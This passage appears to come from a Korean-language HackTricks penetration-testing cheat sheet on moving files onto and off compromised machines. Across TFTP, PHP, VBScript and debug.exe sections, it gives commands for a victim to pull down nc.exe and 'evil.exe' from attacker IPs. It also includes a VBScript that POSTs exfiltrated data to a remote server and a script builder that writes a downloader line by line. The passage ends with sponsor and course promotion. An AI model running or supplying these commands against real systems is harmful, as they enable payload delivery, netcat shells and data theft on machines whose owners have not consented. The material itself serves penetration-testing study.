파일이 존재하지 않는 경우, 오류 패킷 (File Not Found)을 클라이언트에게 전송합니다. 그 외의 경우, 오류 패킷 (Illegal TFTP Operation)을 클라이언트에게 전송합니다.

이 서버는 `tftp_server()` 함수를 호출하여 실행됩니다.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**피해자**에서 Kali 서버에 연결하세요:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHP 원라이너를 사용하여 파일을 다운로드합니다:

```php
<?php
$fileUrl = 'http://example.com/file.txt';
$saveTo = '/path/to/save/file.txt';

file_put_contents($saveTo, file_get_contents($fileUrl));
?>
```

이 PHP 코드는 `file_get_contents()` 함수를 사용하여 원격 파일의 내용을 가져와서 `file_put_contents()` 함수를 사용하여 로컬 파일로 저장합니다. 이를 통해 파일을 다운로드할 수 있습니다. `fileUrl` 변수에는 다운로드할 파일의 URL을, `saveTo` 변수에는 로컬에 저장할 파일의 경로를 지정해야 합니다.
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript는 Microsoft에서 개발한 스크립트 언어로, Windows 운영 체제에서 사용됩니다. VBScript는 주로 웹 페이지와 같은 환경에서 사용되며, 간단한 작업을 자동화하고 사용자와 상호 작용하는 데 사용됩니다.

VBScript를 사용하여 데이터를 유출하는 방법 중 하나는 파일을 생성하고 해당 파일에 데이터를 기록하는 것입니다. 다음은 VBScript를 사용하여 데이터를 파일로 유출하는 예입니다.

```vbscript
Dim fso, file
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\exfiltrated_data.txt", True)
file.WriteLine("Exfiltrated data")
file.Close
```

위의 예제에서는 `Scripting.FileSystemObject`를 사용하여 파일 시스템에 액세스하고, `CreateTextFile` 메서드를 사용하여 새 파일을 생성합니다. 그런 다음 `WriteLine` 메서드를 사용하여 데이터를 파일에 기록하고, `Close` 메서드를 사용하여 파일을 닫습니다.

VBScript를 사용하여 데이터를 유출하는 또 다른 방법은 네트워크를 통해 데이터를 전송하는 것입니다. 다음은 VBScript를 사용하여 데이터를 원격 서버로 전송하는 예입니다.

```vbscript
Dim objXMLHTTP, strURL, strData
strURL = "http://example.com/endpoint"
strData = "exfiltrated_data"

Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objXMLHTTP.open "POST", strURL, False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=" & strData

Set objXMLHTTP = Nothing
```

위의 예제에서는 `MSXML2.ServerXMLHTTP`를 사용하여 HTTP 요청을 만들고, `open` 메서드를 사용하여 POST 요청을 설정합니다. 그런 다음 `setRequestHeader` 메서드를 사용하여 요청 헤더를 설정하고, `send` 메서드를 사용하여 데이터를 전송합니다.

VBScript를 사용하여 데이터를 유출하는 방법은 다양하지만, 이러한 예제는 일반적인 기술과 리소스를 보여줍니다. 실제로 데이터를 유출할 때는 항상 법적인 제한과 윤리적인 고려 사항을 염두에 두어야 합니다.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**피해자**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` 프로그램은 이진 파일을 검사하는 것뿐만 아니라 **16진수로부터 이진 파일을 재구성하는 능력**도 갖추고 있습니다. 이는 `debug.exe`가 이진 파일을 생성할 수 있다는 것을 의미합니다. 그러나, `debug.exe`는 **64 kb까지의 파일을 어셈블하는 제한이 있다는 점**을 유의해야 합니다.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
그런 다음 윈도우 셸에 텍스트를 복사하여 nc.exe라는 파일을 생성합니다.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>와 함께 AWS 해킹을 처음부터 전문가까지 배워보세요</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>
